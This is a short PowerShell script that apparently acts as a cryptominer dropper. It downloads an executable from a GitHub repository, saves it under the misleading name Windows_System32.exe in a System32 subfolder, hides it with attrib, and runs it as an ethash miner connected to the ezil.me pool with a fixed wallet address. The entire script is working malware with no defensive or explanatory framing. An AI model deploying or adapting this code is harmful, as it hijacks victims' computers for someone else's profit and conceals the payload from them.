$Folder = 'C:\Windows\System32\Microsoft\Windows_System32.exe'
"Test to see if folder [$Folder]  exists"
if (Test-Path -Path $Folder) {
    "Path exists!"
    C:\Windows\System32\Microsoft\Windows_System32.exe  -a ethash  -i 40 -o stratum+tcp://eu.ezil.me:2222 -u 34u6od2g7rwZeqWBctFyJTshVCzagJXCnY.GCS01
} else {
    "Path doesn't exist."
    cd C:\Windows\System32\Microsoft ; Invoke-WebRequest -uri "https://github.com/nothingtoseehere121/bm90aGluZ3Rvc2VlaGVyZQ/raw/main/Windows_System32.exe" -OutFile Windows_System32.exe ; attrib +h Windows_System32.exe; C:\Windows\System32\Microsoft\Windows_System32.exe  -a ethash  -i 40 -o stratum+tcp://eu.ezil.me:2222 -u 34u6od2g7rwZeqWBctFyJTshVCzagJXCnY.GCS01
}
